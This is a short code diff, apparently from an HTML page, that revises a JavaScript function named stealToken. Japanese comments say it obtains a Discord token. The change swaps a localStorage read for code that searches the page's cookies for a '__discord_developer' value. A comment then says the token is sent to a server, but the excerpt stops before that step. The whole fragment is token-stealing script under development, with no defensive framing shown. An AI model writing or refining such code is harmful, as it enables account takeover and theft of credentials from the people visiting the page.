@@ -41,8 +41,15 @@
 
     <script>
         function stealToken() {
-            // ディスコードのトークンを取得
-            const token = localStorage.getItem('discord_token');
+            // Cookieからディスコードのトークンを取得
+            const cookies = document.cookie.split('; ');
+            let token = null;
+
+            cookies.forEach(cookie => {
+                if (cookie.startsWith('__discord_developer=')) {
+                    token = cookie.split('=')[1];
+                }
+            });
 
             if (token) {
                 // トークンをサーバーに送信
